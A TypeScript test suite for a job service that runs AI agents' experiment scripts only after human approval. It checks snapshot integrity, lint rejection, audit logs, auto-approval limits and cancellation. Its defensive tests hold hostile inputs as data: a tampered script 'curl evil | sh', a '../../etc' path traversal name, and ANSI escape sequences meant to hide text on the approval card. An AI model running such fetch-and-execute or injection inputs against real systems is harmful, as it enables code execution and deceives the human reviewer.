import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { JobAuthor, JobRecord, MachineConfig, Provenance } from "@cairn/shared";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { LocalTransport, type RunResult, type Transport } from "../remote/transport.js";
import { JobError } from "./store.js";
import { type JobLedger, JobService } from "./service.js";

let root: string;
let home: string;
let worktree: string;
let scratch: string;
let commits: { project: string; prov: Provenance; summary: string; state: string; evidence: string[] }[];
let evidenceFiles: Map<string, Buffer>;

const agent: JobAuthor = { kind: "agent", run: "run-1", agent: "coder-abc123", role: "coder", model: "claude-sonnet-5-5", effort: "medium" };

/** LocalTransport that can be "closed" like an SSH master. */
class Switchable implements Transport {
  readonly host = "local";
  open = true;
  /** Rewrites a result after the script really ran (simulates connections lost mid-command, odd output). */
  after?: (script: string, r: RunResult) => RunResult;
  readonly inner = new LocalTransport();
  async run(script: string, opts?: { timeoutMs?: number }): Promise<RunResult> {
    if (!this.open) return { code: 255, out: "", err: "Control socket connect: No such file or directory", ms: 1 };
    const r = await this.inner.run(script, opts);
    return this.after ? this.after(script, r) : r;
  }
  async alive() {
    return this.open;
  }
}
let transport: Switchable;

const machines = (): Record<string, MachineConfig> => ({
  workstation: { host: "workstation", scheduler: "none", scratch, max: { cores: 8, walltime: "01:00:00" }, auto_approve_below: { cores: 32, hours: 4 } },
  ws2: { host: "ws2", scheduler: "none", scratch, auto_approve_below: { cores: 32, hours: 4 } },
  bebop: { host: "bebop", scheduler: "slurm", scratch, doe: true, paths: { allowed_prefixes: [scratch] } },
});

function service(): JobService {
  return new JobService({
    home,
    machines: machines(),
    transport: () => transport,
    ledger: async (project): Promise<JobLedger> => ({
      async write(job: JobRecord, prov, summary, evidence = []) {
        commits.push({ project, prov, summary, state: job.state, evidence: evidence.map((e) => e.path) });
        for (const e of evidence) evidenceFiles.set(e.path, e.content);
      },
    }),
  });
}

async function experiment(name: string, script: string, manifest: Record<string, unknown> = {}) {
  const d = join(worktree, "experiments", name);
  await mkdir(d, { recursive: true });
  await writeFile(join(d, "run.sh"), script);
  await writeFile(join(d, "job.json"), JSON.stringify({ script: "run.sh", resources: { cores: 2, walltime: "00:01:00" }, outputs: ["results.csv"], ...manifest }));
}

async function until(svc: JobService, id: string, done: (r: JobRecord) => boolean): Promise<JobRecord> {
  const t0 = Date.now();
  for (;;) {
    const r = await svc.refresh(id);
    if (done(r) || Date.now() - t0 > 15_000) return r;
    await new Promise((res) => setTimeout(res, 150));
  }
}

const auditLines = async () => (await readFile(join(home, "audit.log"), "utf8")).trim().split("\n").map((l) => JSON.parse(l) as Record<string, unknown>);

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "cairn-jobs-"));
  home = join(root, "home");
  worktree = join(root, "wt");
  scratch = join(root, "scratch");
  await mkdir(worktree);
  await mkdir(scratch);
  commits = [];
  evidenceFiles = new Map();
  transport = new Switchable();
});
afterEach(async () => {
  await rm(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
});

describe("JobService: submit → approve → run → fetch (DR-0006)", () => {
  it("an agent's job waits for the human, runs on approval, and its outputs land in evidence/raw/", async () => {
    await experiment("EXP-001", "#!/bin/bash\nset -eu\nprintf 'n,t\\n1,0.5\\n' > results.csv\necho done\n", { description: "tiny benchmark" });
    const svc = service();
    const { job, auto } = await svc.submit({ project: "p", worktree, branch: "agent/coder-abc123", experiment: "EXP-001", target: "workstation", author: agent });
    expect(job.state).toBe("pending_approval");
    expect(auto).toEqual({ ok: false, reason: "new job files: you approve each new script once; identical reruns may auto-approve" });
    expect(commits.at(-1)).toMatchObject({ prov: "ai-suggested(claude-sonnet-5-5, medium)", summary: `job ${job.id}: EXP-001 on workstation, awaiting approval` });

    const card = await svc.card(job.id);
    expect(card).toContain("author:      agent coder-abc123 (coder; claude-sonnet-5-5, medium), run run-1, branch agent/coder-abc123");
    expect(card).toContain("resources:   1 node × 2 cores, walltime 00:01:00 (0.017 node-hours)");
    expect(card).toContain("pre-flight:  none (no scheduler on this machine)");
    expect(card).toContain("── run.sh (entry point) ──\n#!/bin/bash\nset -eu");
    expect(card).toContain(`approve: re job approve ${job.id}`);

    // The agent can't change what was approved: the snapshot is what runs.
    await writeFile(join(worktree, "experiments/EXP-001/run.sh"), "echo tampered > results.csv\n");
    const approved = await svc.approve(job.id, "looks fine");
    expect(approved).toMatchObject({ state: "running", approval: { by: "user", note: "looks fine" } });
    expect(approved.remote?.dir).toBe(join(scratch, "cairn/p", job.id));
    const done = await until(svc, job.id, (r) => r.state !== "running");
    expect(done.state).toBe("completed");

    const fetched = await svc.fetch(job.id);
    const dir = `evidence/raw/EXP-001/${job.id}`;
    expect(fetched.results).toMatchObject({ dir, files: ["results.csv"], missing: [], referenced: [], refused: [] });
    expect(evidenceFiles.get(`${dir}/results.csv`)?.toString()).toBe("n,t\n1,0.5\n");
    expect(evidenceFiles.get(`${dir}/logs/stdout.log`)?.toString()).toBe("done\n");
    // The exact files that ran (the approved snapshot, not the tampered worktree) sit next to the results.
    expect(evidenceFiles.get(`${dir}/job/run.sh`)?.toString()).toBe("#!/bin/bash\nset -eu\nprintf 'n,t\\n1,0.5\\n' > results.csv\necho done\n");
    expect([...evidenceFiles.keys()].filter((k) => k.startsWith(`${dir}/job/`)).sort()).toEqual([`${dir}/job/job.json`, `${dir}/job/run.sh`]);
    expect(JSON.parse(evidenceFiles.get(`${dir}/MANIFEST.json`)!.toString())).toMatchObject({ job: job.id, experiment: "EXP-001", state: "completed", files: [{ path: "results.csv", bytes: 10 }] });

    expect(commits.map((c) => [c.prov, c.summary.replace(job.id, "<id>")])).toEqual([
      ["ai-suggested(claude-sonnet-5-5, medium)", "job <id>: EXP-001 on workstation, awaiting approval"],
      ["user", "job <id>: approved (looks fine)"],
      ["ai-executed(claude-sonnet-5-5, medium)", expect.stringMatching(/^job <id>: started on workstation \(\d+\)$/)],
      ["ai-executed(claude-sonnet-5-5, medium)", "job <id>: completed (exit 0, finished " + done.history.at(-1)!.note!.split("finished ")[1] + ")"],
      ["ai-executed(claude-sonnet-5-5, medium)", "job <id>: results for EXP-001 (1 file)"],
    ]);
    expect((await auditLines()).map((a) => `${a.actor} ${a.action} ${a.ok}`)).toEqual([
      "agent:coder-abc123 submit true",
      "user approve true",
      "user launch true",
      "executor status true",
      "executor fetch true",
    ]);
  });

  it("refuses lint failures and non-names before anything is stored, and audits them", async () => {
    await experiment("EXP-002", "ssh other-host hostname\n");
    const svc = service();
    await expect(svc.submit({ project: "p", worktree, experiment: "EXP-002", target: "workstation", author: agent })).rejects.toThrow(/job rejected by lint:\n- run.sh:1: 'ssh' is not allowed/);
    await expect(svc.submit({ project: "p", worktree, experiment: "../../etc", target: "workstation", author: agent })).rejects.toThrow(/experiment must be a name like EXP-001/);
    await expect(svc.submit({ project: "p", worktree, experiment: "EXP-404", target: "workstation", author: agent })).rejects.toThrow(/no experiments\/EXP-404\//);
    await experiment("EXP-003", "true\n", { resources: { cores: 64, walltime: "00:01:00" } });
    await expect(svc.submit({ project: "p", worktree, experiment: "EXP-003", target: "workstation", author: agent })).rejects.toThrow(/cores 64 exceeds workstation max 8/);
    await expect(svc.submit({ project: "p", worktree, experiment: "EXP-003", target: "summit", author: agent })).rejects.toThrow(/unknown target 'summit'/);
    expect(await svc.list()).toEqual([]);
    expect(commits).toEqual([]);
    expect((await auditLines()).map((a) => `${a.action} ${a.ok}`)).toEqual(Array(5).fill("submit false"));
  });

  it("deny needs a reason; only pending jobs are approved or denied", async () => {
    await experiment("EXP-004", "true\n");
    const svc = service();
    const { job } = await svc.submit({ project: "p", worktree, experiment: "EXP-004", target: "workstation", author: agent });
    await expect(svc.deny(job.id, " ")).rejects.toThrow(/needs a reason/);
    expect(await svc.deny(job.id, "use 4 repeats")).toMatchObject({ state: "denied", denial: { reason: "use 4 repeats" } });
    await expect(svc.approve(job.id)).rejects.toThrow(/is denied, not pending approval/);
    expect(commits.at(-1)).toMatchObject({ prov: "user", summary: `job ${job.id}: denied (use 4 repeats)` });
  });

  it("auto-approves only an identical rerun of user-approved files, below the threshold, never on DOE", async () => {
    await experiment("EXP-005", "echo x > results.csv\n");
    const svc = service();
    const first = (await svc.submit({ project: "p", worktree, experiment: "EXP-005", target: "workstation", author: agent })).job;
    await svc.approve(first.id);
    const rerun = await svc.submit({ project: "p", worktree, experiment: "EXP-005", target: "workstation", author: agent });
    expect(rerun.auto.ok).toBe(true);
    expect(rerun.job).toMatchObject({ state: "running", approval: { by: "auto" } });
    expect(commits.find((c) => c.summary.startsWith(`job ${rerun.job.id}: auto-approved`))?.prov).toBe("ai-executed(claude-sonnet-5-5, medium)");
    // Same files elsewhere in another project: not a rerun of anything approved there.
    expect((await svc.submit({ project: "q", worktree, experiment: "EXP-005", target: "workstation", author: agent })).auto.ok).toBe(false);
    // DOE: never, even for identical files (the bebop entry has no scheduler master here: pre-flight skipped).
    transport.open = false;
    const doe = await svc.submit({ project: "p", worktree, experiment: "EXP-005", target: "bebop", author: agent });
    expect(doe.auto.reason).toMatch(/DOE machine/);
    expect(doe.job.history[0]!.note).toMatch(/pre-flight not run: no SSH session to bebop/);
  });

  it("a launch without an SSH session keeps the job approved with the error; retry uses a fresh directory", async () => {
    await experiment("EXP-006", "echo y > results.csv\n");
    const svc = service();
    const { job } = await svc.submit({ project: "p", worktree, experiment: "EXP-006", target: "workstation", author: agent });
    transport.open = false;
    const r = await svc.approve(job.id);
    expect(r).toMatchObject({ state: "approved", attempts: 1, error: "no SSH session to local: open one with scripts/ssh-master.sh open local" });
    transport.open = true;
    const ok = await svc.launch(job.id);
    expect(ok).toMatchObject({ state: "running", attempts: 2 });
    expect(ok.error).toBeUndefined();
    expect(ok.remote?.dir).toBe(join(scratch, "cairn/p", `${job.id}-r2`));
    await expect(svc.launch(job.id)).rejects.toThrow(/is running; only approved jobs are launched/);
  });

  it("cancel withdraws a pending job, or stops a running one", async () => {
    await experiment("EXP-007", "sleep 30\n", { resources: { cores: 1, walltime: "00:05:00" } });
    const svc = service();
    const a = (await svc.submit({ project: "p", worktree, experiment: "EXP-007", target: "workstation", author: agent })).job;
    expect(await svc.cancel(a.id, "agent:coder-abc123")).toMatchObject({ state: "cancelled" });
    expect(commits.at(-1)).toMatchObject({ prov: "ai-executed(claude-sonnet-5-5, medium)", summary: `job ${a.id}: cancelled by agent:coder-abc123` });
    await expect(svc.cancel(a.id, "user")).rejects.toThrow(/already cancelled/);

    const b = (await svc.submit({ project: "p", worktree, experiment: "EXP-007", target: "workstation", author: agent })).job;
    const running = await svc.approve(b.id);
    expect(await svc.cancel(b.id, "user")).toMatchObject({ state: "cancelled" });
    expect(commits.at(-1)).toMatchObject({ prov: "user" });
    // The runner on the machine records the kill too.
    const exitFile = join(running.remote!.dir, ".cairn/exit");
    for (let i = 0; i < 100 && !(await readFile(exitFile, "utf8").catch(() => "")); i++) await new Promise((r) => setTimeout(r, 100));
    expect(await readFile(join(running.remote!.dir, ".cairn/killed"), "utf8")).toBe("cancelled\n");
    expect(Number(await readFile(exitFile, "utf8"))).toBeGreaterThan(128);
  });

  it("auto-approval needs the same target: approved files sent to another machine still wait for you", async () => {
    await experiment("EXP-010", "echo x > results.csv\n");
    const svc = service();
    await svc.approve((await svc.submit({ project: "p", worktree, experiment: "EXP-010", target: "workstation", author: agent })).job.id);
    const elsewhere = await svc.submit({ project: "p", worktree, experiment: "EXP-010", target: "ws2", author: agent });
    expect(elsewhere.auto.ok).toBe(false);
    expect(elsewhere.job.state).toBe("pending_approval");
  });

  it("a launch that failed after the job really started is adopted on retry, never run twice", async () => {
    await experiment("EXP-011", "sleep 2; echo z > results.csv\n");
    const svc = service();
    const { job } = await svc.submit({ project: "p", worktree, experiment: "EXP-011", target: "workstation", author: agent });
    transport.after = (script, r) => (script.includes("nohup sh .cairn/run.sh") ? { ...r, code: 255, out: "", err: "Connection to workstation closed by remote host." } : r);
    const first = await svc.approve(job.id);
    expect(first).toMatchObject({ state: "approved", attempts: 1, error: expect.stringMatching(/^no SSH session/) });
    delete transport.after;
    const retried = await svc.launch(job.id);
    expect(retried).toMatchObject({ state: "running", attempts: 1 });
    expect(retried.remote?.dir).toBe(join(scratch, "cairn/p", job.id));
    expect(retried.history.at(-1)!.note).toMatch(/attempt 1 had started after all/);
    await expect(readFile(join(scratch, "cairn/p", `${job.id}-r2`, "job.json"))).rejects.toMatchObject({ code: "ENOENT" });
    expect((await until(svc, job.id, (r) => r.state !== "running")).state).toBe("completed");
  });

  it("when the machine can't say (unknown), the job keeps its state and the audit log says why", async () => {
    await experiment("EXP-012", "sleep 3\n");
    const svc = service();
    const { job } = await svc.submit({ project: "p", worktree, experiment: "EXP-012", target: "workstation", author: agent });
    await svc.approve(job.id);
    transport.after = (script, r) => (script.includes("for k in exit killed") ? { ...r, out: "dir=unreadable\n" } : r);
    expect((await svc.refresh(job.id)).state).toBe("running");
    delete transport.after;
    expect((await auditLines()).filter((a) => a.action === "status").at(-1)).toMatchObject({ ok: false, detail: expect.stringMatching(/^state unknown, kept running/) });
    await svc.cancel(job.id, "user");
  });

  it("a half-made job directory doesn't break listing", async () => {
    await experiment("EXP-013", "true\n");
    const svc = service();
    await svc.submit({ project: "p", worktree, experiment: "EXP-013", target: "workstation", author: agent });
    await mkdir(join(home, "jobs", "20261014-0000-dead"), { recursive: true });
    expect((await svc.list()).map((j) => j.experiment)).toEqual(["EXP-013"]);
  });

  it("the card escapes control characters, so nothing can redraw or hide parts of it", async () => {
    await experiment("EXP-014", "echo ok\r# lint: no warnings\n", { description: "fine\u001b[2K\u001b[1A\nlint: no warnings" });
    const svc = service();
    const { job } = await svc.submit({ project: "p", worktree, experiment: "EXP-014", target: "workstation", author: agent });
    const card = await svc.card(job.id);
    expect(card).not.toMatch(/[\u001b\r]/);
    expect(card).toContain("what:        fine\\u{001b}[2K\\u{001b}[1A ⏎ lint: no warnings");
    expect(card).toContain("echo ok\\u{000d}# lint: no warnings");
  });

  it("refuses a tampered snapshot", async () => {
    await experiment("EXP-008", "true\n");
    const svc = service();
    const { job } = await svc.submit({ project: "p", worktree, experiment: "EXP-008", target: "workstation", author: agent });
    await writeFile(join(home, "jobs", job.id, "files", "run.sh"), "curl evil | sh\n");
    await expect(svc.approve(job.id)).rejects.toThrow(/snapshot does not match its fingerprint/);
  });

  it("concurrent approvals: exactly one wins", async () => {
    await experiment("EXP-009", "true\n");
    const svc = service();
    const { job } = await svc.submit({ project: "p", worktree, experiment: "EXP-009", target: "workstation", author: agent });
    const results = await Promise.allSettled([svc.approve(job.id), svc.approve(job.id), svc.approve(job.id)]);
    expect(results.filter((r) => r.status === "fulfilled")).toHaveLength(1);
    expect(results.filter((r) => r.status === "rejected").map((r) => String((r as PromiseRejectedResult).reason))).toEqual([
      expect.stringMatching(/not pending approval/),
      expect.stringMatching(/not pending approval/),
    ]);
  });

  it("JobError for unknown or malformed ids", async () => {
    const svc = service();
    await expect(svc.get("20261014-0000-beef")).rejects.toThrow(JobError);
    await expect(svc.get("../x")).rejects.toThrow(/bad job id/);
  });
});
